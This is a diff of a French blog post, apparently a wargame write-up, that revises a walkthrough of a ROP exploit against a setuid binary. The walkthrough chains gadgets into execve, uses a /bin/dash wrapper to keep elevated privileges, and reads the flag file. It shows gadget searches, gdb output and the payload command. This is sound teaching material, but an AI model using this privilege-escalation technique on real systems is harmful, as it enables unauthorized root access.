@@ -193,9 +193,9 @@ gdb$ ni
 0x0000000000434e10 in mprotect ()
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Bien!  Est-ce qu&amp;rsquo;on peut mettre les arguments voulus dans les registres idoines, maintenant?  Je ne vois pas comment faire, arrivé à ce stade.  C&amp;rsquo;est malin, j&amp;rsquo;aurais dû y penser plus tôt.  Ca a l&amp;rsquo;air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.&lt;/p&gt;
+&lt;p&gt;Bien!  Est-ce qu&amp;rsquo;on peut mettre les arguments voulus dans les registres idoines, maintenant?  Comment connaître la taille du segment mémoire qu&amp;rsquo;on veut rendre exécutable?  Et depuis où?  C&amp;rsquo;est très probablement faisable, mais je suis débutant et je ne vois pas comment faire, arrivé à ce stade.  C&amp;rsquo;est malin, j&amp;rsquo;aurais dû y penser plus tôt.  Du coup ça m&amp;rsquo;a l&amp;rsquo;air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.&lt;/p&gt;
 
-&lt;h2 id=&#34;bon-ben-rop&#34;&gt;Bon&amp;hellip; ben ROP.&lt;/h2&gt;
+&lt;h2 id=&#34;bon-ben-va-falloir-passer-par-du-rop&#34;&gt;Bon&amp;hellip; ben va falloir passer par du ROP.&lt;/h2&gt;
 
 &lt;p&gt;L&amp;rsquo;objectif est de trouver des séquences d&amp;rsquo;instructions dans la zone exécutable de la mémoire du processus, afin de les emboîter petit à petit pour arriver à une succession d&amp;rsquo;opérations qui feront quelque chose de particulier.  En l&amp;rsquo;occurrence, obtenir un shell avec les droits privilégiés.&lt;/p&gt;
 
@@ -208,7 +208,7 @@ $ wget https://github.com/downloads/0vercl0k/rp/rp-lin-x64 -O /tmp/p/
 $ chmod +x /tmp/p/rp-lin-x64
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;On a choisi &lt;code&gt;rp++&lt;/code&gt;, un peu par hasard.  Et parce que ce qu&amp;rsquo;on va faire est simple (il y en a d&amp;rsquo;autres, comme &lt;code&gt;ROPgadget&lt;/code&gt;), car on veut juste &lt;code&gt;pop&lt;/code&gt;-er des valeurs de la stack pour les mettre dans des registres.  Nothing fancy, comme on dit.&lt;/p&gt;
+&lt;p&gt;On a choisi &lt;code&gt;rp++&lt;/code&gt; (il y en a d&amp;rsquo;autres, comme &lt;code&gt;ROPgadget&lt;/code&gt;), un peu par hasard.  C&amp;rsquo;est le premier venu quand j&amp;rsquo;ai fait une recherche sur Google et co,,e ce qu&amp;rsquo;on va faire est simple (on veut juste &lt;code&gt;pop&lt;/code&gt;-er des valeurs de la stack pour les mettre dans des registres) pas la peine de passer du temps à chercher l&amp;rsquo;outil qui possède les meilleures features&amp;hellip;&lt;/p&gt;
 
 &lt;p&gt;On va tenter de faire exécuter un &lt;code&gt;execve()&lt;/code&gt; via des gadgets, du coup.  Ce qu&amp;rsquo;on souhaite, c&amp;rsquo;est faire executer &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL);&lt;/code&gt;.  Notons que d&amp;rsquo;après la documentation de l&amp;rsquo;ABI du système, &lt;code&gt;$rax&lt;/code&gt; doit contenir le numéro du syscall (et le contenu sera écrasé lors du retour de fonction, si jamais il se produit&amp;hellip; dans notre cas on s&amp;rsquo;en moque, puisqu&amp;rsquo;on veut spawner un shell).  Il faudra donc mettre les registres dans l&amp;rsquo;état suivant:&lt;/p&gt;
 
@@ -260,7 +260,21 @@ $ rp-lin-x64 -f prog --unique  -r 1 | egrep &amp;quot;pop rdx&amp;quot;
 $
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;On ne trouve pas &lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; dans le binaire, ni d&amp;rsquo;autres chemins susceptible de nous plaire&amp;hellip;  On va utiliser un trick:  trouver une petite chaîne dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à &lt;code&gt;/bin/dash&lt;/code&gt; qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire &lt;code&gt;/tmp/p&lt;/code&gt;, qui est dans le &lt;code&gt;PATH&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;On ne trouve pas &lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; dans le binaire, ni d&amp;rsquo;autres chemins susceptible de nous plaire&amp;hellip;  On va utiliser un trick:  trouver une chaîne de caractère dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à &lt;code&gt;/bin/dash&lt;/code&gt; qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire &lt;code&gt;/tmp/p&lt;/code&gt;, qui est dans le &lt;code&gt;PATH&lt;/code&gt;.  Pourquoi &lt;code&gt;/bin/dash&lt;/code&gt; et pas &lt;code&gt;/bin/sh&lt;/code&gt; ou &lt;code&gt;/bin/bash&lt;/code&gt;?  Sur ce système, comme souvent, on a ça :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ ls -l /bin/sh
+lrwxrwxrwx 1 root root 4 mai   16  2015 /bin/sh -&amp;gt; bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Or il semble que &lt;code&gt;bash&lt;/code&gt; pose problème à cause de l&amp;rsquo;option &lt;code&gt;-p&lt;/code&gt; (pas référencée dans la &lt;code&gt;manpage&lt;/code&gt;, juste mentionnée dans un paragraphe), qui a cet effet:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the  SHEL‐
+LOPTS,  BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at invocation, the startup behavior is the
+same, but the effective user id is not reset.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Du coup, plutôt que s&amp;rsquo;embêter à gérer ce cas particulier, autant utiliser &lt;code&gt;/bin/dash&lt;/code&gt; qui n&amp;rsquo;a pas ce genre de comportement.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;$ readelf -x .rodata ./prog | less
 [...]
@@ -356,9 +370,6 @@ Breakpoint 1, 0x00000000004010ec in main ()
 gdb$ x/i $rip
 =&amp;gt; 0x4010ec &amp;lt;main+142&amp;gt;: ret
 
-gdb$ x/i 0x000000000044d2b4
-   0x44d2b4 &amp;lt;__printf_fp+4676&amp;gt;: pop    rax
-
 gdb$ x/2i 0x000000000044d2b4
    0x44d2b4 &amp;lt;__printf_fp+4676&amp;gt;: pop    rax
    0x44d2b5 &amp;lt;__printf_fp+4677&amp;gt;: ret
@@ -379,7 +390,7 @@ gdb$ x/i 0x0000000000400488
    0x400488 &amp;lt;backtrace_and_maps+183&amp;gt;:   syscall
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Vérifions que la chaîne est celle attendue:&lt;/p&gt;
+&lt;p&gt;Vérifions également que la chaîne est celle attendue:&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;gdb$ x/s 0x0000000000493c00
 0x493c00:       &amp;quot;Be@&amp;quot;
@@ -419,7 +430,7 @@ Segmentation fault
 &lt;pre&gt;&lt;code&gt;execve(&amp;quot;Be@&amp;quot;, [0], [/* 0 vars */])      = -1 ENOENT (No such file or directory)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;On est content, on a la confirmation qu&amp;rsquo;&lt;code&gt;execve()&lt;/code&gt; est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que&amp;hellip; &lt;code&gt;&amp;quot;Be@&amp;quot;&lt;/code&gt; n&amp;rsquo;est pas trouvé (&lt;code&gt;ENOENT&lt;/code&gt;)!  En fait le programme regarde dans le &lt;code&gt;CWD&lt;/code&gt;.  Il faut donc qu&amp;rsquo;on exécute notre programme depuis le répertoire contenant notre wrapper a &lt;code&gt;/bin/dash&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;On est content, on a la confirmation qu&amp;rsquo;&lt;code&gt;execve()&lt;/code&gt; est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que&amp;hellip; &lt;code&gt;&amp;quot;Be@&amp;quot;&lt;/code&gt; n&amp;rsquo;est pas trouvé (&lt;code&gt;ENOENT&lt;/code&gt;)!  En fait le programme regarde dans le &lt;code&gt;CWD&lt;/code&gt; et ne trouve rien.  Donc &lt;code&gt;execve()&lt;/code&gt; échoue et on passe à l&amp;rsquo;instruction suivante&amp;hellip; qu&amp;rsquo;on n&amp;rsquo;a pas gérée, &lt;code&gt;$rip&lt;/code&gt; contient donc une adresse arbitraire, le programme saute à cette adresse et plante lamentablement.  C&amp;rsquo;est logique, puisque nous avons fourni un chemin relatif, le système ne sait donc pas qu&amp;rsquo;il faut chercher dans &lt;code&gt;/tmp/p&lt;/code&gt; et regarde juste dans le répertoire courant.  Il faut donc qu&amp;rsquo;on exécute notre programme depuis le répertoire contenant notre wrapper a &lt;code&gt;/bin/dash&lt;/code&gt;:&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;$ cd /tmp/p &amp;amp;&amp;amp; (perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot;&#39;) | strace ~/prog
 [...]
@@ -443,13 +454,8 @@ Hex result: 41414141414141414141414141414141414141414141414141414141414141414141
 ls
 Be@  ropchain.py  rp-lin-x64
 cd /home/user
-ls -la
-total 876
-drwxr-x---  2 user-cracked user           4096 May 25  2015 .
-drwxr-xr-x 27 root         root           4096 Sep 26 20:01 ..
--r--------  1 user-cracked user-cracked     23 Jun  7  2015 .passwd
--rwsr-x---  1 user-cracked user         877214 May 16  2015 prog
--rw-r-----  1 user-cracked user            383 May 24  2015 prog.c
+ls -a
+    .passwd prog prog.c
 cat .passwd
 CeciEstMonFlagTagadaTsoinTsoin!
 &lt;/code&gt;&lt;/pre&gt;
